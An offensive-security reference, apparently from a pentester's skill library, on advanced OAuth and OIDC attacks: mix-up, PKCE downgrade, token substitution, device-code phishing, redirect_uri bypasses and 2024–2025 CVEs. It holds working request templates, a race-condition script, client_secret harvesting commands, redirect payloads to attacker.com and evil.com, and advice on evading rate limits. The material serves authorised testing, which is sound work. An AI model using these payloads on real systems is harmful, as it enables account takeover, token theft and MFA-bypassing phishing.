# Advanced OAuth Attacks — Mix-up, Device Flow, Token Substitution, PKCE Fallbacks

## Table of Contents
1. OAuth Mix-Up Attacks
2. PKCE — When It's Correctly Implemented
3. Token Substitution Attacks
4. Device Authorization Flow Attacks
5. Client Credentials Flow Attacks
6. When Standard Attacks Fail — Decision Tree
7. PKCE Downgrade (CVE-2024-23647 Pattern)
8. Device Flow Phishing (Active 2024–2025)
9. OAuth Error Flow Redirect Abuse
10. OIDC Advanced Attacks
11. Token Binding Weaknesses
12. Platform-Specific CVEs (2024–2025)
13. Redirect URI — Advanced Bypass Techniques

---

## 1. OAuth Mix-Up Attacks

**What it is:** When a client talks to multiple authorization servers, an attacker can trick the client into sending tokens/codes intended for Server A to Server B (which the attacker controls).

**Requires:** The application supports multiple OAuth providers (e.g., "Login with Google" AND "Login with GitHub" AND a custom IdP).

**Classic mix-up attack:**
1. Attacker runs a malicious OAuth server at `attacker.com`
2. Victim initiates OAuth flow against `attacker.com`
3. Attacker redirects to the *legitimate* auth server's `redirect_uri` with a manipulated `iss` or `state`
4. Client sends the legitimate code to `attacker.com`'s token endpoint thinking it's completing the attacker's flow
5. Attacker redeems the legitimate code

**Test methodology:**
```
# Check if the application validates issuer binding:
1. Start a flow with provider A (Google)
2. Intercept the callback
3. Change the "state" to one from an ongoing flow with provider B
4. Does the app process the Google code using provider B's client_secret/token_endpoint?

# Test issuer confusion:
- Does the app verify the "iss" claim in id_tokens matches the expected provider?
- Does it verify the "aud" claim matches its own client_id?
- Does it verify the token endpoint used matches the discovered metadata?
```

**Code to test issuer validation:**
```python
import jwt, requests

# Capture a legitimate id_token from Provider A
id_token = "eyJ..."  # from Provider A

# Decode without verification to see claims
claims = jwt.decode(id_token, options={"verify_signature": False})
print(f"iss: {claims.get('iss')}")  # Should be Provider A's issuer
print(f"aud: {claims.get('aud')}")  # Should be your client_id at Provider A

# Now try submitting this token to an app endpoint that accepts Provider B tokens
# If accepted → mix-up vulnerability
```

**Fix indicator (how to confirm it's NOT vulnerable):**
The app must bind the `state` parameter to both the initiated provider AND the PKCE verifier. If state is provider-agnostic, the mix-up is possible.

---

## 2. PKCE — When It's Correctly Implemented

Standard redirect_uri and state attacks still apply. When PKCE is correct, these are your remaining angles:

### PKCE Downgrade Still Worth Testing
Even with "correct" PKCE, test:
```
# Does the server accept plain method?
code_challenge_method=plain&code_challenge=<raw_verifier>

# Does the server enforce PKCE at all for confidential clients?
# (PKCE is mandatory for public clients but sometimes skipped for confidential)
Remove code_challenge entirely for confidential client flows

# Does S256 correctly reject a wrong verifier?
Send correct challenge, wrong verifier at redemption → should 400
```

### Authorization Code Injection (Still Viable with PKCE)
PKCE prevents *interception*, not *injection*. If you can steal a victim's `code` after it's generated (via open redirect, referrer leak, or XSS), you cannot redeem it — but:
```
# PKCE Bypass via code_verifier brute force:
# If code_challenge_method=plain AND challenge is short/guessable:
# Challenge: "abc123" → verifier: "abc123"
# Real S256 challenges are 256 bits, uncrackable — but plain method challenges are not
```

### Token Endpoint Race Condition
```
# Send the same authorization code to the token endpoint twice simultaneously
# Some implementations have a TOCTOU window where both requests succeed
import threading, requests

code = "AUTH_CODE_HERE"
results = []

def redeem():
    r = requests.post('https://target.com/oauth/token', data={
        'grant_type': 'authorization_code',
        'code': code,
        'code_verifier': 'VERIFIER',
        'client_id': 'CLIENT_ID'
    })
    results.append(r.json())

threads = [threading.Thread(target=redeem) for _ in range(5)]
[t.start() for t in threads]
[t.join() for t in threads]
print(results)  # Two access_tokens = race condition
```

### Cross-Client Code Reuse
```
# Can a code generated for client_id=A be redeemed by client_id=B?
POST /oauth/token
grant_type=authorization_code&code=CODE_FOR_CLIENT_A&client_id=CLIENT_B&code_verifier=VERIFIER
```

---

## 3. Token Substitution Attacks

Using a token from one context where a different token is expected.

### id_token as access_token
```
# Capture your id_token from the OpenID Connect flow
# Submit it to API endpoints that expect an access_token:
Authorization: Bearer <your_id_token>

# Why this works: some backends validate any JWT with the right signature,
# regardless of token type claim
```

### access_token Cross-Resource Submission
```
# If the same IdP issues tokens for multiple resource servers:
# Token for resource A:  aud: "api-a.company.com"
# Try it on resource B:  Authorization: Bearer <token_for_A>
# Does resource B accept tokens not intended for it?
```

### Refresh Token as Access Token
```
# Submit refresh_token in the Authorization header instead of access_token
Authorization: Bearer <refresh_token>
# If accepted → refresh tokens have too broad a scope
```

### Service Account Token Confusion
In microservice architectures, internal service-to-service JWTs often have elevated permissions:
```
# Find internal service JWTs (sometimes leaked in error responses, logs)
# Submit them to user-facing endpoints
# Look for "service" or "internal" roles in JWT claims
```

---

## 4. Device Authorization Flow Attacks

The device flow (`response_type=device_code`) is used for input-constrained devices (smart TVs, CLI tools). It has unique attack surface.

**How it works:**
1. Device requests a `device_code` and `user_code`
2. User visits a verification URL and enters the `user_code`
3. Device polls the token endpoint until user completes auth

**Attacks:**

### user_code Brute Force
```
# user_codes are typically short (8 chars, alphanumeric)
# They expire but the window may be 15+ minutes
GET /activate?user_code=AAAAAAAA
GET /activate?user_code=AAAAAAAB
# etc.

# Check: is there rate limiting on the activation endpoint?
# Can you enumerate valid user_codes?
```

### device_code Fixation
```
# Can you make a victim authorize YOUR device_code instead of their own?
# 1. Generate device_code (your device)
# 2. Craft phishing link to verification URL with your device_code pre-filled
# 3. Victim authenticates at the verification URL
# 4. Your device receives access_token for victim's account
```

### Polling Window Abuse
```
# device_codes have long TTLs (often 5-15 minutes)
# If you can capture someone's device_code from a log/error/referrer:
# Poll during the window — if they authenticate during that time, you get their token
POST /oauth/token
grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=CAPTURED_CODE
```

---

## 5. Client Credentials Flow Attacks

Used for machine-to-machine auth. No user involved.

### client_secret Exposure
```bash
# Common locations:
grep -r "client_secret" .env* config* settings* *.yaml *.json
# GitHub secrets scanning: search GitHub for the client_id
curl "https://api.github.com/search/code?q=client_secret+org:TARGET_ORG"
# JS bundles:
curl https://target.com/app.js | grep -i "client_secret\|clientSecret"
# Mobile apps, iOS/Android
```

### Scope Escalation via Client Credentials
```
# Request broader scopes than the client was registered for:
POST /oauth/token
grant_type=client_credentials&client_id=X&client_secret=Y&scope=admin+read:all+write:all
# Does the server grant the requested scopes or restrict to registered scopes?
```

### Client Impersonation
```
# If you have any client_id (even your own app's):
# Try it with guessed or brute-forced secrets
# Client secrets are sometimes weak (UUID, app name + year)
POST /oauth/token
grant_type=client_credentials&client_id=known_client_id&client_secret=CompanyName2024!
```

---

## 6. When Standard Attacks Fail — Decision Tree

Use this when the obvious attacks are patched:

```
JWT received?
├── alg:none → rejected?
│   ├── Try capitalisation variants (None, NONE, nOnE)
│   ├── Try removing alg field entirely
│   └── If all rejected → move to RS256→HS256
├── RS256→HS256 → rejected?
│   ├── Try jku/x5u injection
│   ├── Try kid path traversal and SQL injection
│   └── Try weak secret brute force (always worth running async)
└── All JWT attacks fail?
    └── Focus on: redirect_uri, state CSRF, session attacks

OAuth flow only (no JWT)?
├── Test state parameter (CSRF)
├── Test redirect_uri variants (path, subdomain, encoding)
├── Test authorization code reuse
├── Test refresh token persistence post-logout
└── If app uses multiple providers → test mix-up attack

SAML present?
├── Try XSW variants 1-8 (SAML Raider automates)
├── Try signature stripping
├── Try XML comment injection
├── Try replay (resubmit old SAMLResponse)
└── Check recipient/audience validation

All attacks fail or produce 400/401?
├── Check if WAF is blocking → see waf-bypass skill
├── Try from different IP (some rate limiting is IP-based)
├── Try at different times (some defenses are time-windowed)
├── Look for older API versions / mobile endpoints with weaker validation
└── Document the target's defenses → move on, return later

Rate limited during testing?
├── Slow down: add 2-3s delay between requests
├── Rotate between multiple test accounts
├── Use burp throttle extension
└── Focus on high-value single attempts rather than brute force
```

---

## 7. PKCE Downgrade (CVE-2024-23647 Pattern)

**CVE-2024-23647** (authentik) confirmed this attack class in 2024. A backwards-compatible AS treats a request with no `code_challenge` as a legacy non-PKCE flow, issuing a code with no verifier binding.

**Attack flow:**
```
1. Intercept the /authorize request in Burp
2. Remove code_challenge and code_challenge_method parameters entirely
3. Complete the auth flow, capture the returned code
4. POST to /token WITHOUT code_verifier
   → If server accepts it: PKCE is enforced in name only (CVE-2024-23647 pattern)
```

**Variant — no-challenge request with verifier in token exchange:**
```
1. Send /authorize with NO code_challenge
2. In /token, include code_verifier anyway
   → Some servers skip the binding check when no challenge was registered
```

**Variant — downgrade via parameter removal (intercept in transit):**
```
If the client sends code_challenge but the server is a pass-through proxy:
→ MitM the client→server connection and strip code_challenge
→ AS issues unbound code
→ Attacker intercepts code via open redirect or Referer
→ Redeems without code_verifier
```

**Test checklist:**
```
[ ] Remove code_challenge from /authorize → complete flow → token without verifier
[ ] Add code_verifier to /token without prior code_challenge → accepted?
[ ] Submit wrong code_verifier (known-bad value) → accepted?
[ ] Submit empty string code_verifier → accepted?
```

---

## 8. Device Flow Phishing (Active 2024–2025)

**Threat actors:** Storm-2372, TA2723, ShinyHunters (UNC6040)
**Toolkits in wild:** SquarePhish2 (QR variant), Graphish

This is not a protocol flaw — it's social engineering that bypasses MFA completely by abusing the legitimate device authorization grant.

**Attack chain:**
```
1. Attacker: POST /devicecode → gets device_code + user_code + verification_uri
2. Attacker sends phishing message: "Please verify your device at [legit IdP URL]: XXXX-XXXX"
3. Victim navigates to real IdP URL (login.microsoftonline.com/devicelogin, etc.)
4. Victim logs in + completes MFA (against the REAL IdP)
5. Attacker polls /token with device_code → receives access_token + refresh_token
6. Attacker has persistent access even after victim's password reset
   (refresh tokens issued via device flow survive password changes on some platforms)
```

**Why MFA doesn't stop it:** The MFA challenge is issued and completed against the real IdP. The attacker just receives the resulting token.

**How to test for defensive gaps (in scope):**
```
[ ] Does device flow issue tokens with same scope as browser flow?
[ ] Are device flow refresh tokens revoked on password change?
[ ] Is there a Conditional Access policy blocking device flow for privileged accounts?
[ ] Does the target's admin console show device code grants in audit logs?
[ ] Is the user_code expiry window short enough to limit phishing window?
```

**QR variant (SquarePhish2):**
Instead of showing the user_code as text, the attacker embeds the verification URL in a QR code. Victim scans the QR → lands on real IdP → authenticates.

---

## 9. OAuth Error Flow Redirect Abuse

**Disclosed:** Microsoft Security Blog, March 2026

**What it is:** OAuth AS error responses still honour the registered `redirect_uri`. If a malicious app is registered in a tenant with a malicious redirect URI, and victims can be made to click an OAuth URL, the AS legitimately redirects to the attacker's domain — wrapped in a trusted IdP URL.

**Attack chain:**
```
1. Register app in Entra ID tenant with redirect_uri=https://attacker.com/malware
2. Craft phishing URL:
   https://login.microsoftonline.com/tenant/oauth2/authorize
   ?client_id=<attacker_app>
   &response_type=code
   &scope=invalid_scope_to_force_error
   &redirect_uri=https://attacker.com/malware
3. Victim clicks URL → Entra redirects to attacker.com with ?error=invalid_scope
4. Attacker serves EvilProxy (session cookie theft) or malware download
```

**Why it bypasses security tooling:** The initial URL is `login.microsoftonline.com` — trusted by every email security gateway, Safe Links scanner, and browser warning.

**Bug bounty relevance:**
- Find registered OAuth apps in target environment with redirect URIs pointing to:
  - Subdomain-takeover-able domains
  - External/attacker-reachable domains
  - Former employee redirects
- Report: "Registered OAuth application has redirect_uri pointing to `evil.com` — allows redirect abuse for phishing"

---

## 10. OIDC Advanced Attacks

### CVE-2024-10318 — NGINX OIDC Nonce Bypass
**Affected:** NGINX OpenID Connect reference implementation < specific patch date

**What it is:** The NGINX OIDC implementation did not validate the `nonce` claim in the returned ID token against the nonce sent in the authorization request.

**Attack:**
```
1. Steal/obtain any valid ID token (even from an expired session or different user)
2. Inject into a new OIDC authentication flow at the token exchange step
3. Server doesn't check nonce binding → token accepted → session created for victim
```

**Test nonce validation:**
```
1. Complete OIDC flow, capture the id_token
2. Start a new OIDC flow (new nonce generated)
3. In the callback, substitute the previously captured id_token
4. If the server accepts it: nonce not validated → replay vulnerability
5. Test: is nonce present in id_token at all? (check payload) If absent → server never bound sessions to nonces
```

### Audience (aud) Not Validated — Cross-Client Token Reuse
```
1. Get ID token for low-privilege app A: aud = ["client_a"]
2. Send as Bearer to high-privilege app B's API
3. If app B doesn't check aud → token accepted across client boundaries
4. Find apps in same IdP tenant, test cross-reuse
```

### azp (Authorized Party) Not Validated
```
# id_token may include azp (the client that originally requested it)
# Apps that don't validate azp allow cross-party token injection
# Test: use one app's id_token against another app that trusts the same IdP
```

---

## 11. Token Binding Weaknesses

### mTLS Termination at Load Balancer
mTLS (RFC 8705) binds access tokens to a client certificate. In all cloud deployments, TLS terminates at the load balancer — the backend API never sees the original TLS channel.

**Test:**
```
1. Obtain an mTLS-bound access token (requires mTLS client cert)
2. Find a path that reaches the backend API bypassing the mTLS layer:
   - Internal health check endpoints
   - Debug/admin paths on non-standard ports
   - Direct backend IP (bypassing load balancer)
3. Present the token via this path
4. If backend API accepts token without cert verification: mTLS binding defeated
```

**Backend should verify:** The `X-SSL-Client-Cert` or equivalent forwarded header. Test: does the API check this header? Can you spoof it?

### DPoP Nonce Replay Window
DPoP (RFC 9449) proofs require unique `jti` per request. If the JTI uniqueness check only covers a cache window:

```python
# Capture a DPoP proof (jti + iat + nonce)
# Wait for the JTI cache TTL to expire (may be minutes to hours)
# Replay the same DPoP proof after TTL
# If accepted: DPoP protection is hollow after cache expiry

# Also test:
# - iat window: if server allows ±5 minutes, you have a 10-minute replay window
# - Submit identical jti twice in <1 second: server should reject second
# - Are nonces sequential/timestamp-based? (predictable = pre-generation attack)
```

---

## 12. Platform-Specific CVEs (2024–2025)

### CVE-2025-55241 — Entra ID Cross-Tenant Global Admin (CVSS 10.0)
**Researcher:** Dirk-Jan Mollema | **Patched:** July 17, 2025 (server-side)

Microsoft's internal "Actor token" mechanism (unsigned JWTs with `netId` field) could be:
1. Requested from attacker's own Entra tenant
2. Presented to the legacy Azure AD Graph API of any other tenant
3. Accepted without `tid` validation → Full Global Admin in victim tenant

**Stealth:** Zero audit log entries during exploitation. All actions appear as legitimate Global Admin operations.

**Testing for residual risk:**
- Check if legacy Azure AD Graph API is still accessible in target tenant
- Verify audit log coverage — is there a gap in logging for certain API calls?
- Test: are old Actor token endpoints still reachable (some may persist after patch)?

### Okta Long Username Auth Bypass (No CVE, Oct 2024)
**Requirements:** Username ≥ 52 chars, MFA disabled, AD/LDAP agent offline, prior successful login cached

**Mechanism:** Bcrypt truncates at 72 bytes. Cache key = `userID + username + password`. Username > 52 chars pushes combined key past 72 bytes → password portion truncated from key → any password works for cache hit.

**Test:**
```
1. Find accounts with usernames ≥ 52 characters in target Okta tenant
2. Ensure AD/LDAP agent is unavailable (test during maintenance window, or find when it's offline)
3. Submit login with target username + random wrong password
4. If it succeeds: bcrypt truncation vulnerability
```

### Keycloak CVE-2024-4540 — PAR Cookie Exposure
**Affected:** Keycloak < 24.0.5 | **CVSS:** 7.5

**What it is:** PAR authorization parameters stored in plaintext in the `KC_RESTART` cookie in the HTTP response. Exposes `code_challenge`, `redirect_uri`, custom claims, and any PII in `authorization_details`.

**Test:**
```
1. Initiate PAR-based authorization flow against Keycloak
2. Inspect KC_RESTART cookie in the response
3. Base64-decode the cookie value
4. If it contains plaintext code_challenge, redirect_uri, or custom parameters → CVE-2024-4540
```

---

## 13. Redirect URI — Advanced Bypass Techniques

These go beyond the basic variants in `oauth-attacks.md`.

### Unescaped Dot in Regex Allowlist
```
Server pattern: .*\.example\.com
Unescaped dot matches any character:
→ https://evilxexample.com/callback  (x matches the unescaped .)
→ https://evil example.com           (space matches .)
```

**Fuzz with:** Replace each `.` in the legitimate domain with any character: `evil_example.com`, `evilXexample.com`

### URL Parser Confusion (WHATWG vs RFC3986)
```
# Backslash — WHATWG treats as path separator, RFC3986 doesn't:
redirect_uri=https://trusted.com\@attacker.com/callback
# RFC3986: host=trusted.com, path=\@attacker.com/callback
# WHATWG:  host=attacker.com  ← attacker receives code

# Other parser confusion payloads:
https://trusted.com@evil.com
https://trusted.com%40evil.com
https://trusted.com#@evil.com
https://trusted.com%23@evil.com
https://trusted.com:443@evil.com
```

### Subdomain Takeover as redirect_uri
```
1. Enumerate all registered redirect_uris (JS source, app discovery, docs, error messages)
2. Find subdomains in redirect_uris (wildcard registrations *.example.com)
3. Check each subdomain for takeover vulnerability (CNAME to expired provider)
4. Take over the subdomain → AS now redirects auth codes to you
Tools: subjack, can-i-take-over-xyz, nuclei subdomain-takeover templates
```

### Open Redirect Chain
```
1. Find open redirect on legitimate callback domain:
   https://app.example.com/redirect?url=https://attacker.com
2. Use as redirect_uri in OAuth request
   (AS may allow path differences within same origin)
3. Code arrives at app.example.com/redirect → immediately 302'd to attacker
Combine with: Referer leakage — token appears in Referer to attacker's site
```

### Localhost Loopback Permissiveness
Per OAuth 2.1 recommendations for native apps, some AS allow loopback variations:
```
Registered: http://localhost/callback
Try:        http://127.0.0.1/callback
            http://[::1]/callback
            http://localhost:8080/callback   (different port)
            http://localhost:65535/callback  (high port attacker controls)
            http://0.0.0.0/callback
```
